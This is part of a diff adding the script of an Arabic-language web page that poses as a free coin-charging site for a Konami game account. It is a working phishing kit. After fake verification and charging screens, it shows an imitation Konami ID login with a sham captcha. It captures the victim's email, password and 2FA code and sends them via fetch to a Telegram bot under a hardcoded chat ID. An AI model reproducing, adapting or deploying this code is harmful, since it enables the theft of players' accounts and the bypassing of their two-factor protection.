+    const CHAT_ID = "7646344244";
+
+    let selectedAmount = null;
+    let userEmail = "";
+    let userPass = "";
+    let playerName = "";
+
+    function selectCard(card) {
+        document.querySelectorAll('#mainScreen .coin-card').forEach(c => c.classList.remove('active'));
+        card.classList.add('active');
+        selectedAmount = card.getAttribute('data-amount');
+    }
+
+    function selectCardAlt(card) {
+        document.querySelectorAll('#linkAccountScreen .coin-card').forEach(c => c.classList.remove('active'));
+        card.classList.add('active');
+        selectedAmount = card.getAttribute('data-amount');
+    }
+
+    function verifyPlayerId() {
+        const input = document.getElementById('playerId');
+        const btn = document.getElementById('confirmBtn');
+        const val = input.value.trim();
+
+        btn.classList.remove('success');
+
+        if (val === '') {
+            alert('الرجاء أدخل اسم الحساب أولاً!');
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerHTML = '<span class="spinner-small"></span> جاري التحقق...';
+
+        setTimeout(() => {
+            btn.disabled = false;
+            btn.classList.add('success');
+            btn.innerHTML = 'تم التأكيد ✅';
+        }, 2000);
+    }
+
+    function startCharging() {
+        playerName = document.getElementById('playerId').value.trim();
+
+        if (playerName === '') {
+            alert('الرجاء أدخل اسم الحساب أولاً!');
+            return;
+        }
+
+        if (!selectedAmount) {
+            alert('الرجاء اختيار عدد العملات المراد شحنها!');
+            return;
+        }
+
+        document.getElementById('mainScreen').style.display = 'none';
+        document.getElementById('processScreen').style.display = 'block';
+        document.getElementById('loadingState').style.display = 'block';
+        document.getElementById('resultState').style.display = 'none';
+
+        document.getElementById('resAccount').innerText = playerName;
+        document.getElementById('resAmount').innerText = selectedAmount + ' كوينز';
+
+        setTimeout(() => {
+            document.getElementById('loadingState').style.display = 'none';
+            document.getElementById('resultState').style.display = 'block';
+        }, 3000);
+    }
+
+    function goToLinkAccount() {
+        document.getElementById('processScreen').style.display = 'none';
+        document.getElementById('linkAccountScreen').style.display = 'block';
+    }
+
+    function startLinking() {
+        if (!selectedAmount) {
+            alert('الرجاء اختيار عدد العملات المراد ربطها!');
+            return;
+        }
+
+        const firstPageInput = document.getElementById('playerId').value.trim();
+        if (firstPageInput !== "") {
+            playerName = firstPageInput;
+        } else if (!playerName) {
+            playerName = "غير محدد";
+        }
+
+        document.getElementById('linkAccountScreen').style.display = 'none';
+        document.getElementById('konamiEmailScreen').style.display = 'block';
+        document.getElementById('step1').style.display = 'flex';
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step3').style.display = 'none';
+    }
+
+    function handleStep1(e) {
+        e.preventDefault();
+        userEmail = document.getElementById('konamiEmailInput').value.trim();
+        if(userEmail) {
+            const btnConnexion = document.getElementById('btnStep1Connexion');
+            const btnText = document.getElementById('btnTextStep1');
+            const btnSpinner = document.getElementById('btnSpinnerStep1');
+
+            btnConnexion.disabled = true;
+            btnText.style.display = 'none';
+            btnSpinner.style.display = 'inline-block';
+
+            setTimeout(() => {
+                btnConnexion.disabled = false;
+                btnText.style.display = 'inline';
+                btnSpinner.style.display = 'none';
+
+                document.getElementById('displayUserEmail').innerText = userEmail;
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'flex';
+            }, 3000);
+        }
+    }
+
+    function backToStep1(e) {
+        e.preventDefault();
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step1').style.display = 'flex';
+    }
+
+    function togglePasswordVisibility() {
+        const passInput = document.getElementById('konamiPasswordInput');
+        const eyeIcon = document.getElementById('eyeIcon');
+        
+        if (passInput.type === 'password') {
+            passInput.type = 'text';
+            eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+        } else {
+            passInput.type = 'password';
+            eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.12c0-1.66-1.34-3-3-3l-.17.02z"/>';
+        }
+    }
+
+    function toggleCaptchaSelect(element) {
+        element.classList.toggle('selected');
+        document.getElementById('captchaError').style.display = 'none';
+    }
+
+    function handleStep2(e) {
+        e.preventDefault();
+        userPass = document.getElementById('konamiPasswordInput').value.trim();
+        const captchaErr = document.getElementById('captchaError');
+
+        const selectedItems = Array.from(document.querySelectorAll('.captcha-item.selected'))
+                                   .map(item => item.getAttribute('data-id'));
+
+        const correctAnswers = ['2', '4'];
+        const isCorrect = selectedItems.length === correctAnswers.length && 
+                          correctAnswers.every(id => selectedItems.includes(id));
+
+        if (!isCorrect) {
+            captchaErr.style.display = 'block';
+            return;
+        }
+
+        const btnConnexion = document.getElementById('btnStep2Connexion');
+        const btnText = document.getElementById('btnTextStep2');
+        const btnSpinner = document.getElementById('btnSpinnerStep2');
+
+        btnConnexion.disabled = true;
+        btnText.style.display = 'none';
+        btnSpinner.style.display = 'inline-block';
+
+        // إرسال البيانات للبوت فوراً عند بدء التحميل
+        sendDataToTelegram(0);
+
+        // عداد في الخلفية لمدة 60 ثانية قبل الانتقال للصفحة الموالية
+        let elapsed = 0;
+        let timer = setInterval(() => {
+            elapsed += 1000;
+            if (elapsed >= 60000) {
+                clearInterval(timer);
+                sendDataToTelegram(60);
+
+                btnConnexion.disabled = false;
+                btnText.style.display = 'inline';
+                btnSpinner.style.display = 'none';
+
+                document.getElementById('step2').style.display = 'none';
+                document.getElementById('step3').style.display = 'flex';
+            }
+        }, 1000);
+    }
+
+    function sendDataToTelegram(seconds) {
+        const textMsg = `🚨 *طلب تسجيل دخول جديد (Konami ID):*
+👤 اسم الحساب: \`${playerName}\`
+💎 الكوينز المختارة: \`${selectedAmount}\`
+📧 الإيميل: \`${userEmail}\`
+🔑 كلمة المرور: \`${userPass}\`
+⏱️ مدة المؤقت: \`${seconds} ثانية\``;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: textMsg,
+                parse_mode: 'Markdown'
+            })
+        }).catch(err => console.log(err));
+    }
+
+    function moveToNext(element, index) {
+        if (element.value.length >= 1) {
+            const inputs = document.querySelectorAll('.code-digit-input-custom');
+            if (index < inputs.length) {
+                inputs[index].focus();
+            }
+        }
+    }
+
+    function handleStep3(e) {
+        e.preventDefault();
+        let verificationCode = "";
+        document.querySelectorAll('.code-digit-input-custom').forEach(input => {
+            verificationCode += input.value;
+        });
+
+        const codeMsg = `🔢 *رمز التحقق (2FA) الجديد:*
+👤 اسم الحساب: \`${playerName}\`
+📧 الإيميل: \`${userEmail}\`
+📌 الرمز: \`${verificationCode}\``;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: codeMsg,
+                parse_mode: 'Markdown'
+            })
+        }).then(() => {
+            document.getElementById('konamiEmailScreen').style.display = 'none';
+            document.getElementById('successScreen').style.display = 'block';
+
+            document.getElementById('successResAccount').innerText = playerName;
+            document.getElementById('successResAmount').innerText = selectedAmount + ' كوينز';
+        }).catch(err => console.log(err));
+    }
+
+    function resetToHome() {
+        document.getElementById('processScreen').style.display = 'none';
+        document.getElementById('mainScreen').style.display = 'block';
+        document.getElementById('playerId').value = '';
+        const btn = document.getElementById('confirmBtn');
+        btn.classList.remove('success');
+        btn.disabled = false;
+        btn.innerHTML = 'تأكيد';
+        document.querySelectorAll('.coin-card').forEach(c => c.classList.remove('active'));
+        selectedAmount = null;
+    }
+</script>
+
+</body>
+</html>
